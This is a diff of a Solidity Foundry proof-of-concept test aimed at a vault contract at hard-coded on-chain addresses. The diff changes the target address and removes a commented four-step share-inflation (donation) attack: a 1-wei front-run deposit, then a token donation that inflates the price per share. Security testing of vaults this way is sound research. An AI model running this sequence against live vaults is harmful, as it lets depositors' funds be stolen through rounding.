@@ -18,8 +18,8 @@ interface IVault {
     function totalSupply() external view returns(uint256);
 }
 
-contract RoundingPOC_59A7eC24fe5849c0ee5C8d23E58B0CeD272D294E is Test {
-    address constant TARGET = 0x59A7eC24fe5849c0ee5C8d23E58B0CeD272D294E;
+contract RoundingPOC_a5A998eA9d59821e74e3456bafEe973690a204FB is Test {
+    address constant TARGET = 0xa5A998eA9d59821e74e3456bafEe973690a204FB;
     IVault v;
     
     function setUp() public {
@@ -43,23 +43,8 @@ contract RoundingPOC_59A7eC24fe5849c0ee5C8d23E58B0CeD272D294E is Test {
                 try v.asset() returns (address a) { asset = a; } catch {}
                 if (asset == address(0)) { try v.token() returns (address a) { asset = a; } catch {} }
                 
-                // Step 1: Get tokens for attack
-                if (asset != address(0)) {
-                    deal(asset, address(this), 10000000000000000000);
-                    IERC20(asset).approve(TARGET, type(uint256).max);
-                }
-                // Step 2: Deposit 1 wei to get 1 share (Front-run)
-                v.deposit(1);
-                // Step 3: Donate 1 token to inflate price per share
-                if (asset != address(0)) {
-                    IERC20(asset).transfer(TARGET, 1000000000000000000);
-                }
-                // Step 4: Verify inflated share price
-                uint256 totalAssets = v.totalAssets();
-                uint256 totalSupply = v.totalSupply();
-                if (totalSupply > 0) {
-                    console.log('Price per share:', totalAssets * 1e18 / totalSupply);
-                }
+                // Step 1: Generic deposit test
+                v.deposit(1000);
         
         // Verify impact
         uint256 assetsAfter = 0;
